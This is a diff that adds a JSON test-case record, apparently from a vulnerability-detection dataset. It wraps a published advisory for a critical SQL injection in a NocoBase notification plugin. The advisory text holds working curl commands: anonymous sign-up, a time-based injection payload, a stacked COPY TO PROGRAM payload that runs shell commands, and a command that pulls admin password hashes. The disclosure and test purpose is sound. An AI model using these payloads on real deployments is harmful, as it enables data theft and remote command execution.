@@ -1,0 +1,173 @@
+{
+  "adjudication": {
+    "admission_output_used": false,
+    "basis": "source_observation",
+    "corpus_v1_evidence_used": false,
+    "corpus_v1_labels_used": false,
+    "corpus_v1_scores_used": false,
+    "detector_output_used": false,
+    "expected_condition_signals": [],
+    "notes": "Partial public-source metadata only; intentionally insufficient as a positive condition.",
+    "ranking_output_used": false,
+    "v6_first_blind_case_errors_used": false,
+    "v6_first_blind_score_used": false
+  },
+  "capture_method": "passive_source_snapshot",
+  "capture_reference": "https://github.com/nocobase/nocobase/security/advisories/GHSA-p849-8hwh-84j9",
+  "captured_at": "2026-08-14T18:58:04.420923+00:00",
+  "case_kind": "sparse_noisy",
+  "collector": {
+    "kind": "v7_public_source_literal_draft",
+    "target_contact_performed": false,
+    "third_party_code_executed": false,
+    "version": "1.0.0"
+  },
+  "family": "sql_injection",
+  "raw": {
+    "details": {
+      "observation_kind": "partial_public_source_metadata",
+      "source_project": "nocobase/nocobase",
+      "version_boundaries": [
+        {
+          "ecosystem": "npm",
+          "package": "@nocobase/plugin-notification-in-app-message",
+          "patched_version": "",
+          "vulnerable_version_range": "<= 2.0.60"
+        },
+        {
+          "ecosystem": "npm",
+          "package": "@nocobase/plugin-notification-in-app-message",
+          "patched_version": "2.0.61",
+          "vulnerable_version_range": "<= 2.0.60"
+        }
+      ],
+      "version_boundary_count": 2
+    },
+    "method": "UNKNOWN"
+  },
+  "source_project": "nocobase/nocobase",
+  "source_root": "GHSA-p849-8hwh-84j9",
+  "source_snapshot": {
+    "payload": {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "kah-ja",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/36455663?v=4",
+            "events_url": "https://api.github.com/users/kah-ja/events{/privacy}",
+            "followers_url": "https://api.github.com/users/kah-ja/followers",
+            "following_url": "https://api.github.com/users/kah-ja/following{/other_user}",
+            "gists_url": "https://api.github.com/users/kah-ja/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/kah-ja",
+            "id": 36455663,
+            "login": "kah-ja",
+            "node_id": "MDQ6VXNlcjM2NDU1NjYz",
+            "organizations_url": "https://api.github.com/users/kah-ja/orgs",
+            "received_events_url": "https://api.github.com/users/kah-ja/received_events",
+            "repos_url": "https://api.github.com/users/kah-ja/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/kah-ja/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/kah-ja/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/kah-ja",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-52887",
+      "cvss": {
+        "score": 10.0,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 10.0,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-89"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-89",
+          "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+        }
+      ],
+      "description": "## Summary\r\n\r\n`GET /api/myInAppChannels:list` accepts a structured `filter` query parameter. The handler for the `latestMsgReceiveTimestamp` field splices the `$lt` value directly into a `Sequelize.literal()` template string with no escape, type cast, or parameter binding. The action ACL is `loggedIn`, so any authenticated account reaches it. The default `auth-basic` authenticator ships `allowSignUp: true`, so the account is obtainable anonymously.\r\n\r\nThe injection is reachable with the URL parameter `filter[latestMsgReceiveTimestamp][$lt]=<expression>`. The `pg` driver in front of Sequelize accepts stacked statements, so the chain extends from boolean and timing oracles to multi-statement payloads.\r\n\r\nThe shipped `docker-compose.yml` creates the DB role `nocobase` on a stock `postgres:16` image, which assigns the `rolsuper` attribute by default. `COPY ... TO PROGRAM '...'` therefore runs shell commands as `uid=999(postgres)` inside the database container.\r\n\r\nResult: any anonymous visitor signs up, signs in, and exfiltrates arbitrary rows or executes shell commands inside the database container with one HTTP GET after the sign-in.\r\n\r\n## Affected\r\n\r\nNocoBase server, `@nocobase/plugin-notification-in-app-message` `<=2.0.57`. Confirmed live-exploitable on the official `nocobase/nocobase:2.0.57` Docker image (HEAD `e35a2737d9df139cacecae0151c3326746e2339a`).\r\n\r\n`@nocobase/plugin-notification-in-app-message` is enabled by default in `@nocobase/preset-nocobase`. The default `auth-basic` ships `allowSignUp: true`. The shipped `docker/app-postgres/docker-compose.yml` uses `POSTGRES_USER=nocobase` against `postgres:16`, which makes the role a PostgreSQL superuser; `COPY ... TO PROGRAM` runs from this role.\r\n\r\n## Root cause\r\n\r\n`packages/plugins/@nocobase/plugin-notification-in-app-message/src/server/defineMyInAppChannels.ts:62-63`: the `latestMsgReceiveTimestamp` filter is built as `Sequelize.literal(\\`${latestMsgReceiveTimestampSQL} < ${filter.latestMsgReceiveTimestamp.$lt}\\`)`. The `$lt` value comes straight from the GET `filter` JSON; the template uses `${...}` interpolation with no `escape()`, `replacements`, or type cast.\r\n\r\n`packages/plugins/@nocobase/plugin-notification-in-app-message/src/server/InAppNotificationChannel.ts:200`: `app.acl.allow('myInAppChannels', '*', 'loggedIn')` exposes every action on the resource to every authenticated role, including the seeded `member`.\r\n\r\n`packages/plugins/@nocobase/plugin-auth/src/server/plugin.ts:295`: `allowSignUp: true` ships in the default `auth-basic` seed; `POST /api/auth:signUp` returns 200 with no admin involvement.\r\n\r\n`docker/app-postgres/docker-compose.yml:30`: `POSTGRES_USER: nocobase` against `postgres:16`. The bare `postgres:16` image creates the named role with `rolsuper=true` (live-verified: `SELECT rolsuper FROM pg_roles WHERE rolname='nocobase'` returns `true`). The `pg` driver simple-query accepts stacked statements.\r\n\r\n## Reproduction\r\n\r\nTested against `nocobase/nocobase:2.0.57` from the official Docker image with the default `app-postgres` compose. Attacker is an anonymously-signed-up `member`.\r\n\r\n1. Anonymous sign-up, then sign-in for a `member` JWT.\r\n\r\n```\r\ncurl -X POST -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"a\",\"password\":\"P!ssw0rd1\",\"confirm_password\":\"P!ssw0rd1\"}' \\\r\n  http://target:13000/api/auth:signUp?authenticator=basic\r\nTOKEN=$(curl -sX POST -H 'Content-Type: application/json' \\\r\n  -d '{\"account\":\"a\",\"password\":\"P!ssw0rd1\"}' \\\r\n  http://target:13000/api/auth:signIn?authenticator=basic | jq -r .data.token)\r\n```\r\n\r\n2. Time-based oracle confirms injection. Each request below takes ~5 seconds.\r\n\r\n```\r\ncurl -sG -H \"Authorization: Bearer $TOKEN\" -H \"X-Authenticator: basic\" \\\r\n  \"http://target:13000/api/myInAppChannels:list\" \\\r\n  --data-urlencode \"filter[latestMsgReceiveTimestamp][\\$lt]=0) AND 1882=(SELECT 1882 FROM PG_SLEEP(5))-- a\"\r\n```\r\n\r\n3. Stacked-statement `COPY ... TO PROGRAM` runs shell as `uid=999(postgres)` inside the database container.\r\n\r\n```\r\ncurl -sG -H \"Authorization: Bearer $TOKEN\" -H \"X-Authenticator: basic\" \\\r\n  \"http://target:13000/api/myInAppChannels:list\" \\\r\n  --data-urlencode \"filter[latestMsgReceiveTimestamp][\\$lt]=0); COPY (SELECT 1) TO PROGRAM 'id > /tmp/PWN_VERIFY.txt'; --\"\r\ndocker exec launch-postgres-1 cat /tmp/PWN_VERIFY.txt\r\n# uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)\r\n```\r\n\r\nLive-verified: sqlmap 1.10.3 against this endpoint reports `Type: boolean-based blind` (payload `0) AND 1511=(SELECT (CASE WHEN (1511=1511) THEN 1511 ELSE (SELECT 4568 UNION SELECT 9477) END))-- KVYH`), `Type: time-based blind`, `current user: nocobase`, `current user is DBA: True`. Admin password hash `ef6ea7f6...8ea12` exfiltrated via `COPY (SELECT email,password FROM users WHERE id=1) TO PROGRAM 'cat > /tmp/PWN_HASH.txt'`. Reproduced 2026-05-26 against HEAD `e35a2737`.\r\n\r\n## Impact\r\n\r\n- Authenticated SQL injection with time-based, boolean-based, and stacked-statement primitives (`pg` driver simple-query).\r\n- Arbitrary row read of any collection, including `users.password` PBKDF2 hashes for the super-admin account.\r\n- Shell command execution as `uid=999(postgres)` inside the PostgreSQL container via `COPY ... TO PROGRAM`.\r\n- Anonymous reach in default deployments because `auth-basic` ships `allowSignUp: true`.\r\n\r\n## Credit\r\n\r\nJan Kahmen, [turingpoint](https://turingpoint.de) (jan@turingpoint.de)",
+      "ghsa_id": "GHSA-p849-8hwh-84j9",
+      "html_url": "https://github.com/nocobase/nocobase/security/advisories/GHSA-p849-8hwh-84j9",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-p849-8hwh-84j9"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-52887"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-06-11T09:42:05Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/525658?v=4",
+        "events_url": "https://api.github.com/users/mytharcher/events{/privacy}",
+        "followers_url": "https://api.github.com/users/mytharcher/followers",
+        "following_url": "https://api.github.com/users/mytharcher/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mytharcher/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/mytharcher",
+        "id": 525658,
+        "login": "mytharcher",
+        "node_id": "MDQ6VXNlcjUyNTY1OA==",
+        "organizations_url": "https://api.github.com/users/mytharcher/orgs",
+        "received_events_url": "https://api.github.com/users/mytharcher/received_events",
+        "repos_url": "https://api.github.com/users/mytharcher/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/mytharcher/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mytharcher/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/mytharcher",
+        "user_view_type": "public"
+      },
+      "severity": "critical",
+      "state": "published",
+      "submission": null,
+      "summary": "SQL injection in /api/myInAppChannels:list filter to PG-superuser RCE",
+      "updated_at": "2026-06-11T09:42:05Z",
+      "url": "https://api.github.com/repos/nocobase/nocobase/security-advisories/GHSA-p849-8hwh-84j9",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@nocobase/plugin-notification-in-app-message"
+          },
+          "patched_versions": "",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "<= 2.0.60"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    "reference": "https://github.com/nocobase/nocobase/security/advisories/GHSA-p849-8hwh-84j9",
+    "retrieved_at": "2026-08-14T18:58:04.420927+00:00",
+    "snapshot_role": "canonical_source"
+  }
+}
